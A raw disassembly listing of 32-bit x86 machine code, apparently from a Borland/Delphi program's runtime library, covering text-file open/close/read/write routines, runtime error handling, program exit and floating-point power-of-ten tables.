  403c05:	6a 00                	push   $0x0
  403c07:	2b c2                	sub    %edx,%eax
  403c09:	50                   	push   %eax
  403c0a:	ff 36                	push   (%esi)
  403c0c:	e8 e7 d5 ff ff       	call   0x4011f8
  403c11:	40                   	inc    %eax
  403c12:	74 67                	je     0x403c7b
  403c14:	ff 36                	push   (%esi)
  403c16:	e8 d5 d5 ff ff       	call   0x4011f0
  403c1b:	48                   	dec    %eax
  403c1c:	75 5d                	jne    0x403c7b
  403c1e:	eb 22                	jmp    0x403c42
  403c20:	c7 46 24 bb 3a 40 00 	movl   $0x403abb,0x24(%esi)
  403c27:	81 7e 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%esi)
  403c2e:	74 04                	je     0x403c34
  403c30:	6a f6                	push   $0xfffffff6
  403c32:	eb 02                	jmp    0x403c36
  403c34:	6a f5                	push   $0xfffffff5
  403c36:	e8 8d d5 ff ff       	call   0x4011c8
  403c3b:	83 f8 ff             	cmp    $0xffffffff,%eax
  403c3e:	74 3b                	je     0x403c7b
  403c40:	89 06                	mov    %eax,(%esi)
  403c42:	81 7e 04 b1 d7 00 00 	cmpl   $0xd7b1,0x4(%esi)
  403c49:	74 17                	je     0x403c62
  403c4b:	ff 36                	push   (%esi)
  403c4d:	e8 5e d5 ff ff       	call   0x4011b0
  403c52:	85 c0                	test   %eax,%eax
  403c54:	74 10                	je     0x403c66
  403c56:	83 f8 02             	cmp    $0x2,%eax
  403c59:	75 07                	jne    0x403c62
  403c5b:	c7 46 20 be 3a 40 00 	movl   $0x403abe,0x20(%esi)
  403c62:	33 c0                	xor    %eax,%eax
  403c64:	5e                   	pop    %esi
  403c65:	c3                   	ret
  403c66:	ff 36                	push   (%esi)
  403c68:	e8 2b d5 ff ff       	call   0x401198
  403c6d:	c7 46 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%esi)
  403c74:	b8 69 00 00 00       	mov    $0x69,%eax
  403c79:	eb e9                	jmp    0x403c64
  403c7b:	c7 46 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%esi)
  403c82:	e8 91 d5 ff ff       	call   0x401218
  403c87:	eb db                	jmp    0x403c64
  403c89:	8d 88 4c 01 00 00    	lea    0x14c(%eax),%ecx
  403c8f:	89 48 14             	mov    %ecx,0x14(%eax)
  403c92:	33 c9                	xor    %ecx,%ecx
  403c94:	89 08                	mov    %ecx,(%eax)
  403c96:	c7 40 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%eax)
  403c9d:	c7 40 08 80 00 00 00 	movl   $0x80,0x8(%eax)
  403ca4:	89 48 0c             	mov    %ecx,0xc(%eax)
  403ca7:	89 48 10             	mov    %ecx,0x10(%eax)
  403caa:	c7 40 18 03 3b 40 00 	movl   $0x403b03,0x18(%eax)
  403cb1:	89 48 1c             	mov    %ecx,0x1c(%eax)
  403cb4:	89 48 20             	mov    %ecx,0x20(%eax)
  403cb7:	89 48 24             	mov    %ecx,0x24(%eax)
  403cba:	8d 40 48             	lea    0x48(%eax),%eax
  403cbd:	85 d2                	test   %edx,%edx
  403cbf:	74 1b                	je     0x403cdc
  403cc1:	b5 82                	mov    $0x82,%ch
  403cc3:	8a 0a                	mov    (%edx),%cl
  403cc5:	42                   	inc    %edx
  403cc6:	88 08                	mov    %cl,(%eax)
  403cc8:	40                   	inc    %eax
  403cc9:	84 c9                	test   %cl,%cl
  403ccb:	74 11                	je     0x403cde
  403ccd:	8a 0a                	mov    (%edx),%cl
  403ccf:	42                   	inc    %edx
  403cd0:	88 08                	mov    %cl,(%eax)
  403cd2:	40                   	inc    %eax
  403cd3:	84 c9                	test   %cl,%cl
  403cd5:	74 07                	je     0x403cde
  403cd7:	fe cd                	dec    %ch
  403cd9:	75 e8                	jne    0x403cc3
  403cdb:	48                   	dec    %eax
  403cdc:	88 28                	mov    %ch,(%eax)
  403cde:	c3                   	ret
  403cdf:	8b 50 04             	mov    0x4(%eax),%edx
  403ce2:	81 fa b2 d7 00 00    	cmp    $0xd7b2,%edx
  403ce8:	75 08                	jne    0x403cf2
  403cea:	ff 50 1c             	call   *0x1c(%eax)
  403ced:	85 c0                	test   %eax,%eax
  403cef:	75 0e                	jne    0x403cff
  403cf1:	c3                   	ret
  403cf2:	81 fa b1 d7 00 00    	cmp    $0xd7b1,%edx
  403cf8:	74 f7                	je     0x403cf1
  403cfa:	b8 67 00 00 00       	mov    $0x67,%eax
  403cff:	e9 70 e9 ff ff       	jmp    0x402674
  403d04:	8b 50 04             	mov    0x4(%eax),%edx
  403d07:	81 fa b2 d7 00 00    	cmp    $0xd7b2,%edx
  403d0d:	75 08                	jne    0x403d17
  403d0f:	ff 50 20             	call   *0x20(%eax)
  403d12:	85 c0                	test   %eax,%eax
  403d14:	75 0e                	jne    0x403d24
  403d16:	c3                   	ret
  403d17:	81 fa b1 d7 00 00    	cmp    $0xd7b1,%edx
  403d1d:	74 f7                	je     0x403d16
  403d1f:	b8 67 00 00 00       	mov    $0x67,%eax
  403d24:	e9 4b e9 ff ff       	jmp    0x402674
  403d29:	8d 40 00             	lea    0x0(%eax),%eax
  403d2c:	53                   	push   %ebx
  403d2d:	8b d8                	mov    %eax,%ebx
  403d2f:	8b 50 04             	mov    0x4(%eax),%edx
  403d32:	81 ea b1 d7 00 00    	sub    $0xd7b1,%edx
  403d38:	74 0e                	je     0x403d48
  403d3a:	83 fa 02             	cmp    $0x2,%edx
  403d3d:	77 19                	ja     0x403d58
  403d3f:	ff 50 1c             	call   *0x1c(%eax)
  403d42:	85 c0                	test   %eax,%eax
  403d44:	75 0b                	jne    0x403d51
  403d46:	8b c3                	mov    %ebx,%eax
  403d48:	ff 53 24             	call   *0x24(%ebx)
  403d4b:	85 c0                	test   %eax,%eax
  403d4d:	75 02                	jne    0x403d51
  403d4f:	5b                   	pop    %ebx
  403d50:	c3                   	ret
  403d51:	e8 1e e9 ff ff       	call   0x402674
  403d56:	eb f7                	jmp    0x403d4f
  403d58:	3d 38 c0 40 00       	cmp    $0x40c038,%eax
  403d5d:	74 f0                	je     0x403d4f
  403d5f:	b8 67 00 00 00       	mov    $0x67,%eax
  403d64:	eb eb                	jmp    0x403d51
  403d66:	8b c0                	mov    %eax,%eax
  403d68:	a3 20 c0 40 00       	mov    %eax,0x40c020
  403d6d:	80 3d 30 c0 40 00 00 	cmpb   $0x0,0x40c030
  403d74:	74 17                	je     0x403d8d
  403d76:	80 3d 14 c4 40 00 01 	cmpb   $0x1,0x40c414
  403d7d:	0f 82 c0 00 00 00    	jb     0x403e43
  403d83:	74 08                	je     0x403d8d
  403d85:	0b c0                	or     %eax,%eax
  403d87:	0f 84 c1 00 00 00    	je     0x403e4e
  403d8d:	a1 24 c0 40 00       	mov    0x40c024,%eax
  403d92:	0b c0                	or     %eax,%eax
  403d94:	74 0c                	je     0x403da2
  403d96:	33 d2                	xor    %edx,%edx
  403d98:	89 15 24 c0 40 00    	mov    %edx,0x40c024
  403d9e:	ff d0                	call   *%eax
  403da0:	eb eb                	jmp    0x403d8d
  403da2:	83 3d 28 c0 40 00 00 	cmpl   $0x0,0x40c028
  403da9:	74 71                	je     0x403e1c
  403dab:	a1 20 c0 40 00       	mov    0x40c020,%eax
  403db0:	bb 24 b0 40 00       	mov    $0x40b024,%ebx
  403db5:	b9 0a 00 00 00       	mov    $0xa,%ecx
  403dba:	33 d2                	xor    %edx,%edx
  403dbc:	f7 f1                	div    %ecx
  403dbe:	80 c2 30             	add    $0x30,%dl
  403dc1:	88 13                	mov    %dl,(%ebx)
  403dc3:	4b                   	dec    %ebx
  403dc4:	85 c0                	test   %eax,%eax
  403dc6:	75 f2                	jne    0x403dba
  403dc8:	bb 30 b0 40 00       	mov    $0x40b030,%ebx
  403dcd:	a1 28 c0 40 00       	mov    0x40c028,%eax
  403dd2:	2d 94 11 40 00       	sub    $0x401194,%eax
  403dd7:	8b d0                	mov    %eax,%edx
  403dd9:	83 e2 0f             	and    $0xf,%edx
  403ddc:	8a 92 7b 3e 40 00    	mov    0x403e7b(%edx),%dl
  403de2:	88 13                	mov    %dl,(%ebx)
  403de4:	4b                   	dec    %ebx
  403de5:	c1 e8 04             	shr    $0x4,%eax
  403de8:	75 ed                	jne    0x403dd7
  403dea:	80 3d 31 c0 40 00 00 	cmpb   $0x0,0x40c031
  403df1:	75 15                	jne    0x403e08
  403df3:	6a 00                	push   $0x0
  403df5:	68 32 b0 40 00       	push   $0x40b032
  403dfa:	68 14 b0 40 00       	push   $0x40b014
  403dff:	6a 00                	push   $0x0
  403e01:	e8 ca d3 ff ff       	call   0x4011d0
  403e06:	eb 14                	jmp    0x403e1c
  403e08:	b8 04 c2 40 00       	mov    $0x40c204,%eax
  403e0d:	ba 14 b0 40 00       	mov    $0x40b014,%edx
  403e12:	e8 dd 03 00 00       	call   0x4041f4
  403e17:	e8 5b 03 00 00       	call   0x404177
  403e1c:	b8 38 c0 40 00       	mov    $0x40c038,%eax
  403e21:	e8 06 ff ff ff       	call   0x403d2c
  403e26:	b8 04 c2 40 00       	mov    $0x40c204,%eax
  403e2b:	e8 fc fe ff ff       	call   0x403d2c
  403e30:	e8 a7 db ff ff       	call   0x4019dc
  403e35:	e8 de f1 ff ff       	call   0x403018
  403e3a:	80 3d 14 c4 40 00 00 	cmpb   $0x0,0x40c414
  403e41:	75 0b                	jne    0x403e4e
  403e43:	ff 35 20 c0 40 00    	push   0x40c020
  403e49:	e8 5a d3 ff ff       	call   0x4011a8
  403e4e:	c6 05 14 c4 40 00 00 	movb   $0x0,0x40c414
  403e55:	a1 20 c0 40 00       	mov    0x40c020,%eax
  403e5a:	f7 d8                	neg    %eax
  403e5c:	1b c0                	sbb    %eax,%eax
  403e5e:	40                   	inc    %eax
  403e5f:	8b 3d 10 c4 40 00    	mov    0x40c410,%edi
  403e65:	8b 35 0c c4 40 00    	mov    0x40c40c,%esi
  403e6b:	8b 1d 08 c4 40 00    	mov    0x40c408,%ebx
  403e71:	8b 2d 04 c4 40 00    	mov    0x40c404,%ebp
  403e77:	c9                   	leave
  403e78:	c2 0c 00             	ret    $0xc
  403e7b:	30 31                	xor    %dh,(%ecx)
  403e7d:	32 33                	xor    (%ebx),%dh
  403e7f:	34 35                	xor    $0x35,%al
  403e81:	36 37                	ss aaa
  403e83:	38 39                	cmp    %bh,(%ecx)
  403e85:	41                   	inc    %ecx
  403e86:	42                   	inc    %edx
  403e87:	43                   	inc    %ebx
  403e88:	44                   	inc    %esp
  403e89:	45                   	inc    %ebp
  403e8a:	46                   	inc    %esi
  403e8b:	33 c0                	xor    %eax,%eax
  403e8d:	eb 00                	jmp    0x403e8f
  403e8f:	33 d2                	xor    %edx,%edx
  403e91:	89 15 28 c0 40 00    	mov    %edx,0x40c028
  403e97:	e9 cc fe ff ff       	jmp    0x403d68
  403e9c:	33 c0                	xor    %eax,%eax
  403e9e:	eb 00                	jmp    0x403ea0
  403ea0:	8f 05 28 c0 40 00    	pop    0x40c028
  403ea6:	e9 bd fe ff ff       	jmp    0x403d68
  403eab:	90                   	nop
  403eac:	53                   	push   %ebx
  403ead:	56                   	push   %esi
  403eae:	8b f0                	mov    %eax,%esi
  403eb0:	8b da                	mov    %edx,%ebx
  403eb2:	8b 56 04             	mov    0x4(%esi),%edx
  403eb5:	81 ea b0 d7 00 00    	sub    $0xd7b0,%edx
  403ebb:	74 0a                	je     0x403ec7
  403ebd:	83 fa 03             	cmp    $0x3,%edx
  403ec0:	77 19                	ja     0x403edb
  403ec2:	e8 65 fe ff ff       	call   0x403d2c
  403ec7:	8b c6                	mov    %esi,%eax
  403ec9:	89 5e 04             	mov    %ebx,0x4(%esi)
  403ecc:	ff 56 18             	call   *0x18(%esi)
  403ecf:	85 c0                	test   %eax,%eax
  403ed1:	74 05                	je     0x403ed8
  403ed3:	e8 9c e7 ff ff       	call   0x402674
  403ed8:	5e                   	pop    %esi
  403ed9:	5b                   	pop    %ebx
  403eda:	c3                   	ret
  403edb:	b8 66 00 00 00       	mov    $0x66,%eax
  403ee0:	e8 8f e7 ff ff       	call   0x402674
  403ee5:	eb f1                	jmp    0x403ed8
  403ee7:	ba b1 d7 00 00       	mov    $0xd7b1,%edx
  403eec:	eb be                	jmp    0x403eac
  403eee:	ba b2 d7 00 00       	mov    $0xd7b2,%edx
  403ef3:	eb b7                	jmp    0x403eac
  403ef5:	ba b3 d7 00 00       	mov    $0xd7b3,%edx
  403efa:	eb b0                	jmp    0x403eac
  403efc:	53                   	push   %ebx
  403efd:	56                   	push   %esi
  403efe:	57                   	push   %edi
  403eff:	8b d8                	mov    %eax,%ebx
  403f01:	8b f2                	mov    %edx,%esi
  403f03:	8b f9                	mov    %ecx,%edi
  403f05:	8b 53 04             	mov    0x4(%ebx),%edx
  403f08:	81 ea b0 d7 00 00    	sub    $0xd7b0,%edx
  403f0e:	74 15                	je     0x403f25
  403f10:	83 fa 03             	cmp    $0x3,%edx
  403f13:	0f 87 9d 00 00 00    	ja     0x403fb6
  403f19:	ff 53 24             	call   *0x24(%ebx)
  403f1c:	85 c0                	test   %eax,%eax
  403f1e:	74 05                	je     0x403f25
  403f20:	e8 4f e7 ff ff       	call   0x402674
  403f25:	c7 43 04 b3 d7 00 00 	movl   $0xd7b3,0x4(%ebx)
  403f2c:	89 73 08             	mov    %esi,0x8(%ebx)
  403f2f:	c7 43 24 ee 3f 40 00 	movl   $0x403fee,0x24(%ebx)
  403f36:	c7 43 1c 9a 3f 40 00 	movl   $0x403f9a,0x1c(%ebx)
  403f3d:	80 7b 48 00          	cmpb   $0x0,0x48(%ebx)
  403f41:	74 5a                	je     0x403f9d
  403f43:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  403f48:	ba 01 00 00 00       	mov    $0x1,%edx
  403f4d:	b9 02 00 00 00       	mov    $0x2,%ecx
  403f52:	83 ef 03             	sub    $0x3,%edi
  403f55:	74 23                	je     0x403f7a
  403f57:	b9 03 00 00 00       	mov    $0x3,%ecx
  403f5c:	47                   	inc    %edi
  403f5d:	74 1b                	je     0x403f7a
  403f5f:	b8 00 00 00 40       	mov    $0x40000000,%eax
  403f64:	47                   	inc    %edi
  403f65:	c7 43 04 b2 d7 00 00 	movl   $0xd7b2,0x4(%ebx)
  403f6c:	74 0c                	je     0x403f7a
  403f6e:	b8 00 00 00 80       	mov    $0x80000000,%eax
  403f73:	c7 43 04 b1 d7 00 00 	movl   $0xd7b1,0x4(%ebx)
  403f7a:	6a 00                	push   $0x0
  403f7c:	68 80 00 00 00       	push   $0x80
  403f81:	51                   	push   %ecx
  403f82:	6a 00                	push   $0x0
  403f84:	52                   	push   %edx
  403f85:	50                   	push   %eax
  403f86:	8d 43 48             	lea    0x48(%ebx),%eax
  403f89:	50                   	push   %eax
  403f8a:	e8 11 d2 ff ff       	call   0x4011a0
  403f8f:	83 f8 ff             	cmp    $0xffffffff,%eax
  403f92:	74 29                	je     0x403fbd
  403f94:	89 03                	mov    %eax,(%ebx)
  403f96:	5f                   	pop    %edi
  403f97:	5e                   	pop    %esi
  403f98:	5b                   	pop    %ebx
  403f99:	c3                   	ret
  403f9a:	33 c0                	xor    %eax,%eax
  403f9c:	c3                   	ret
  403f9d:	c7 43 24 9a 3f 40 00 	movl   $0x403f9a,0x24(%ebx)
  403fa4:	83 ff 03             	cmp    $0x3,%edi
  403fa7:	74 04                	je     0x403fad
  403fa9:	6a f6                	push   $0xfffffff6
  403fab:	eb 02                	jmp    0x403faf
  403fad:	6a f5                	push   $0xfffffff5
  403faf:	e8 14 d2 ff ff       	call   0x4011c8
  403fb4:	eb d9                	jmp    0x403f8f
  403fb6:	b8 66 00 00 00       	mov    $0x66,%eax
  403fbb:	eb 0c                	jmp    0x403fc9
  403fbd:	c7 43 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%ebx)
  403fc4:	e8 4f d2 ff ff       	call   0x401218
  403fc9:	e8 a6 e6 ff ff       	call   0x402674
  403fce:	eb c6                	jmp    0x403f96
  403fd0:	33 c9                	xor    %ecx,%ecx
  403fd2:	8a 0d 33 c0 40 00    	mov    0x40c033,%cl
  403fd8:	80 f9 02             	cmp    $0x2,%cl
  403fdb:	76 02                	jbe    0x403fdf
  403fdd:	b1 02                	mov    $0x2,%cl
  403fdf:	e9 18 ff ff ff       	jmp    0x403efc
  403fe4:	b9 03 00 00 00       	mov    $0x3,%ecx
  403fe9:	e9 0e ff ff ff       	jmp    0x403efc
  403fee:	ff 30                	push   (%eax)
  403ff0:	c7 40 04 b0 d7 00 00 	movl   $0xd7b0,0x4(%eax)
  403ff7:	e8 9c d1 ff ff       	call   0x401198
  403ffc:	48                   	dec    %eax
  403ffd:	0f 85 81 e6 ff ff    	jne    0x402684
  404003:	c3                   	ret
  404004:	8b c8                	mov    %eax,%ecx
  404006:	8b 41 04             	mov    0x4(%ecx),%eax
  404009:	2d b1 d7 00 00       	sub    $0xd7b1,%eax
  40400e:	83 f8 02             	cmp    $0x2,%eax
  404011:	77 19                	ja     0x40402c
  404013:	6a 00                	push   $0x0
  404015:	8b 41 08             	mov    0x8(%ecx),%eax
  404018:	f7 e2                	mul    %edx
  40401a:	6a 00                	push   $0x0
  40401c:	50                   	push   %eax
  40401d:	ff 31                	push   (%ecx)
  40401f:	e8 d4 d1 ff ff       	call   0x4011f8
  404024:	40                   	inc    %eax
  404025:	0f 84 59 e6 ff ff    	je     0x402684
  40402b:	c3                   	ret
  40402c:	b8 67 00 00 00       	mov    $0x67,%eax
  404031:	e9 3e e6 ff ff       	jmp    0x402674
  404036:	8b c0                	mov    %eax,%eax
  404038:	8b 50 04             	mov    0x4(%eax),%edx
  40403b:	81 ea b1 d7 00 00    	sub    $0xd7b1,%edx
  404041:	83 fa 02             	cmp    $0x2,%edx
  404044:	77 0f                	ja     0x404055
  404046:	ff 30                	push   (%eax)
  404048:	e8 a3 d1 ff ff       	call   0x4011f0
  40404d:	48                   	dec    %eax
  40404e:	0f 85 30 e6 ff ff    	jne    0x402684
  404054:	c3                   	ret
  404055:	b8 67 00 00 00       	mov    $0x67,%eax
  40405a:	e9 15 e6 ff ff       	jmp    0x402674
  40405f:	90                   	nop
  404060:	53                   	push   %ebx
  404061:	8b d8                	mov    %eax,%ebx
  404063:	8b 40 04             	mov    0x4(%eax),%eax
  404066:	2d b2 d7 00 00       	sub    $0xd7b2,%eax
  40406b:	83 f8 01             	cmp    $0x1,%eax
  40406e:	77 2b                	ja     0x40409b
  404070:	6a 00                	push   $0x0
  404072:	8b c4                	mov    %esp,%eax
  404074:	6a 00                	push   $0x0
  404076:	50                   	push   %eax
  404077:	ff 73 08             	push   0x8(%ebx)
  40407a:	52                   	push   %edx
  40407b:	ff 33                	push   (%ebx)
  40407d:	e8 7e d1 ff ff       	call   0x401200
  404082:	5a                   	pop    %edx
  404083:	48                   	dec    %eax
  404084:	75 09                	jne    0x40408f
  404086:	3b 53 08             	cmp    0x8(%ebx),%edx
  404089:	75 17                	jne    0x4040a2
  40408b:	8b c3                	mov    %ebx,%eax
  40408d:	5b                   	pop    %ebx
  40408e:	c3                   	ret
  40408f:	e8 84 d1 ff ff       	call   0x401218
  404094:	e8 db e5 ff ff       	call   0x402674
  404099:	eb f0                	jmp    0x40408b
  40409b:	b8 05 00 00 00       	mov    $0x5,%eax
  4040a0:	eb f2                	jmp    0x404094
  4040a2:	b8 65 00 00 00       	mov    $0x65,%eax
  4040a7:	eb eb                	jmp    0x404094
  4040a9:	8d 40 00             	lea    0x0(%eax),%eax
  4040ac:	56                   	push   %esi
  4040ad:	57                   	push   %edi
  4040ae:	8b f2                	mov    %edx,%esi
  4040b0:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  4040b7:	75 2e                	jne    0x4040e7
  4040b9:	8b 78 14             	mov    0x14(%eax),%edi
  4040bc:	03 78 0c             	add    0xc(%eax),%edi
  4040bf:	8b 50 08             	mov    0x8(%eax),%edx
  4040c2:	2b 50 0c             	sub    0xc(%eax),%edx
  4040c5:	3b d1                	cmp    %ecx,%edx
  4040c7:	7f 16                	jg     0x4040df
  4040c9:	01 50 0c             	add    %edx,0xc(%eax)
  4040cc:	2b ca                	sub    %edx,%ecx
  4040ce:	50                   	push   %eax
  4040cf:	51                   	push   %ecx
  4040d0:	8b ca                	mov    %edx,%ecx
  4040d2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4040d4:	ff 50 1c             	call   *0x1c(%eax)
  4040d7:	85 c0                	test   %eax,%eax
  4040d9:	75 33                	jne    0x40410e
  4040db:	59                   	pop    %ecx
  4040dc:	58                   	pop    %eax
  4040dd:	eb da                	jmp    0x4040b9
  4040df:	01 48 0c             	add    %ecx,0xc(%eax)
  4040e2:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4040e4:	5f                   	pop    %edi
  4040e5:	5e                   	pop    %esi
  4040e6:	c3                   	ret
  4040e7:	3d 04 c2 40 00       	cmp    $0x40c204,%eax
  4040ec:	75 14                	jne    0x404102
  4040ee:	51                   	push   %ecx
  4040ef:	52                   	push   %edx
  4040f0:	50                   	push   %eax
  4040f1:	e8 f8 fd ff ff       	call   0x403eee
  4040f6:	58                   	pop    %eax
  4040f7:	5a                   	pop    %edx
  4040f8:	59                   	pop    %ecx
  4040f9:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  404100:	74 b7                	je     0x4040b9
  404102:	b8 69 00 00 00       	mov    $0x69,%eax
  404107:	e8 68 e5 ff ff       	call   0x402674
  40410c:	eb d6                	jmp    0x4040e4
  40410e:	e8 61 e5 ff ff       	call   0x402674
  404113:	59                   	pop    %ecx
  404114:	58                   	pop    %eax
  404115:	eb cd                	jmp    0x4040e4
  404117:	8b ca                	mov    %edx,%ecx
  404119:	ba 38 b0 40 00       	mov    $0x40b038,%edx
  40411e:	83 f9 40             	cmp    $0x40,%ecx
  404121:	7e 21                	jle    0x404144
  404123:	83 e9 40             	sub    $0x40,%ecx
  404126:	50                   	push   %eax
  404127:	51                   	push   %ecx
  404128:	b9 40 00 00 00       	mov    $0x40,%ecx
  40412d:	e8 7a ff ff ff       	call   0x4040ac
  404132:	e8 75 ef ff ff       	call   0x4030ac
  404137:	83 b8 04 00 00 00 00 	cmpl   $0x0,0x4(%eax)
  40413e:	75 0d                	jne    0x40414d
  404140:	59                   	pop    %ecx
  404141:	58                   	pop    %eax
  404142:	eb d5                	jmp    0x404119
  404144:	85 c9                	test   %ecx,%ecx
  404146:	0f 8f 60 ff ff ff    	jg     0x4040ac
  40414c:	c3                   	ret
  40414d:	59                   	pop    %ecx
  40414e:	58                   	pop    %eax
  40414f:	c3                   	ret
  404150:	33 c9                	xor    %ecx,%ecx
  404152:	8a 0a                	mov    (%edx),%cl
  404154:	42                   	inc    %edx
  404155:	e9 52 ff ff ff       	jmp    0x4040ac
  40415a:	53                   	push   %ebx
  40415b:	33 db                	xor    %ebx,%ebx
  40415d:	8a 1a                	mov    (%edx),%bl
  40415f:	2b cb                	sub    %ebx,%ecx
  404161:	7e 0b                	jle    0x40416e
  404163:	50                   	push   %eax
  404164:	52                   	push   %edx
  404165:	8b d1                	mov    %ecx,%edx
  404167:	e8 ab ff ff ff       	call   0x404117
  40416c:	5a                   	pop    %edx
  40416d:	58                   	pop    %eax
  40416e:	8b cb                	mov    %ebx,%ecx
  404170:	5b                   	pop    %ebx
  404171:	42                   	inc    %edx
  404172:	e9 35 ff ff ff       	jmp    0x4040ac
  404177:	ba 78 b0 40 00       	mov    $0x40b078,%edx
  40417c:	b9 02 00 00 00       	mov    $0x2,%ecx
  404181:	e8 26 ff ff ff       	call   0x4040ac
  404186:	e9 79 fb ff ff       	jmp    0x403d04
  40418b:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  404192:	75 1e                	jne    0x4041b2
  404194:	8b 48 0c             	mov    0xc(%eax),%ecx
  404197:	3b 48 08             	cmp    0x8(%eax),%ecx
  40419a:	7d 09                	jge    0x4041a5
  40419c:	03 48 14             	add    0x14(%eax),%ecx
  40419f:	88 11                	mov    %dl,(%ecx)
  4041a1:	ff 40 0c             	incl   0xc(%eax)
  4041a4:	c3                   	ret
  4041a5:	50                   	push   %eax
  4041a6:	52                   	push   %edx
  4041a7:	ff 50 1c             	call   *0x1c(%eax)
  4041aa:	85 c0                	test   %eax,%eax
  4041ac:	75 27                	jne    0x4041d5
  4041ae:	5a                   	pop    %edx
  4041af:	58                   	pop    %eax
  4041b0:	eb e2                	jmp    0x404194
  4041b2:	3d 04 c2 40 00       	cmp    $0x40c204,%eax
  4041b7:	75 12                	jne    0x4041cb
  4041b9:	52                   	push   %edx
  4041ba:	50                   	push   %eax
  4041bb:	e8 2e fd ff ff       	call   0x403eee
  4041c0:	58                   	pop    %eax
  4041c1:	5a                   	pop    %edx
  4041c2:	81 78 04 b2 d7 00 00 	cmpl   $0xd7b2,0x4(%eax)
  4041c9:	74 c9                	je     0x404194
  4041cb:	b8 69 00 00 00       	mov    $0x69,%eax
  4041d0:	e9 9f e4 ff ff       	jmp    0x402674
  4041d5:	e8 9a e4 ff ff       	call   0x402674
  4041da:	5a                   	pop    %edx
  4041db:	58                   	pop    %eax
  4041dc:	c3                   	ret
  4041dd:	52                   	push   %edx
  4041de:	8d 51 ff             	lea    -0x1(%ecx),%edx
  4041e1:	e8 31 ff ff ff       	call   0x404117
  4041e6:	8b d4                	mov    %esp,%edx
  4041e8:	b9 01 00 00 00       	mov    $0x1,%ecx
  4041ed:	e8 ba fe ff ff       	call   0x4040ac
  4041f2:	5a                   	pop    %edx
  4041f3:	c3                   	ret
  4041f4:	33 c9                	xor    %ecx,%ecx
  4041f6:	eb 00                	jmp    0x4041f8
  4041f8:	56                   	push   %esi
  4041f9:	57                   	push   %edi
  4041fa:	8b f0                	mov    %eax,%esi
  4041fc:	51                   	push   %ecx
  4041fd:	8b fa                	mov    %edx,%edi
  4041ff:	83 c9 ff             	or     $0xffffffff,%ecx
  404202:	b0 00                	mov    $0x0,%al
  404204:	f2 ae                	repnz scas %es:(%edi),%al
  404206:	f7 d1                	not    %ecx
  404208:	49                   	dec    %ecx
  404209:	8b fa                	mov    %edx,%edi
  40420b:	5a                   	pop    %edx
  40420c:	2b d1                	sub    %ecx,%edx
  40420e:	8b c6                	mov    %esi,%eax
  404210:	51                   	push   %ecx
  404211:	e8 01 ff ff ff       	call   0x404117
  404216:	59                   	pop    %ecx
  404217:	8b c6                	mov    %esi,%eax
  404219:	8b d7                	mov    %edi,%edx
  40421b:	5f                   	pop    %edi
  40421c:	5e                   	pop    %esi
  40421d:	e9 8a fe ff ff       	jmp    0x4040ac
  404222:	8b c0                	mov    %eax,%eax
  404224:	85 c0                	test   %eax,%eax
  404226:	7c 48                	jl     0x404270
  404228:	74 45                	je     0x40426f
  40422a:	3d 00 14 00 00       	cmp    $0x1400,%eax
  40422f:	0f 8d 7f 00 00 00    	jge    0x4042b4
  404235:	8b d0                	mov    %eax,%edx
  404237:	83 e2 1f             	and    $0x1f,%edx
  40423a:	8d 14 92             	lea    (%edx,%edx,4),%edx
  40423d:	db 2c 55 c8 42 40 00 	fldt   0x4042c8(,%edx,2)
  404244:	de c9                	fmulp  %st,%st(1)
  404246:	c1 e8 05             	shr    $0x5,%eax
  404249:	74 24                	je     0x40426f
  40424b:	8b d0                	mov    %eax,%edx
  40424d:	83 e2 0f             	and    $0xf,%edx
  404250:	74 0c                	je     0x40425e
  404252:	8d 14 92             	lea    (%edx,%edx,4),%edx
  404255:	db 2c 55 fe 43 40 00 	fldt   0x4043fe(,%edx,2)
  40425c:	de c9                	fmulp  %st,%st(1)
  40425e:	c1 e8 04             	shr    $0x4,%eax
  404261:	74 0c                	je     0x40426f
  404263:	8d 04 80             	lea    (%eax,%eax,4),%eax
  404266:	db 2c 45 94 44 40 00 	fldt   0x404494(,%eax,2)
  40426d:	de c9                	fmulp  %st,%st(1)
  40426f:	c3                   	ret
  404270:	f7 d8                	neg    %eax
  404272:	3d 00 14 00 00       	cmp    $0x1400,%eax
  404277:	7d 42                	jge    0x4042bb
  404279:	8b d0                	mov    %eax,%edx
  40427b:	83 e2 1f             	and    $0x1f,%edx
  40427e:	8d 14 92             	lea    (%edx,%edx,4),%edx
  404281:	db 2c 55 c8 42 40 00 	fldt   0x4042c8(,%edx,2)
  404288:	de f9                	fdivrp %st,%st(1)
  40428a:	c1 e8 05             	shr    $0x5,%eax
  40428d:	74 e0                	je     0x40426f
  40428f:	8b d0                	mov    %eax,%edx
  404291:	83 e2 0f             	and    $0xf,%edx
  404294:	74 0c                	je     0x4042a2
  404296:	8d 14 92             	lea    (%edx,%edx,4),%edx
  404299:	db 2c 55 fe 43 40 00 	fldt   0x4043fe(,%edx,2)
  4042a0:	de f9                	fdivrp %st,%st(1)
  4042a2:	c1 e8 04             	shr    $0x4,%eax
  4042a5:	74 c8                	je     0x40426f
  4042a7:	8d 04 80             	lea    (%eax,%eax,4),%eax
  4042aa:	db 2c 45 94 44 40 00 	fldt   0x404494(,%eax,2)
  4042b1:	de f9                	fdivrp %st,%st(1)
  4042b3:	c3                   	ret
  4042b4:	db 2d be 42 40 00    	fldt   0x4042be
  4042ba:	c3                   	ret
  4042bb:	d9 ee                	fldz
  4042bd:	c3                   	ret
  4042be:	00 00                	add    %al,(%eax)
  4042c0:	00 00                	add    %al,(%eax)
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	00 80 ff 7f 00 00    	add    %al,0x7fff(%eax)
  4042ca:	00 00                	add    %al,(%eax)
  4042cc:	00 00                	add    %al,(%eax)
  4042ce:	00 80 ff 3f 00 00    	add    %al,0x3fff(%eax)
  4042d4:	00 00                	add    %al,(%eax)
  4042d6:	00 00                	add    %al,(%eax)
  4042d8:	00 a0 02 40 00 00    	add    %ah,0x4002(%eax)
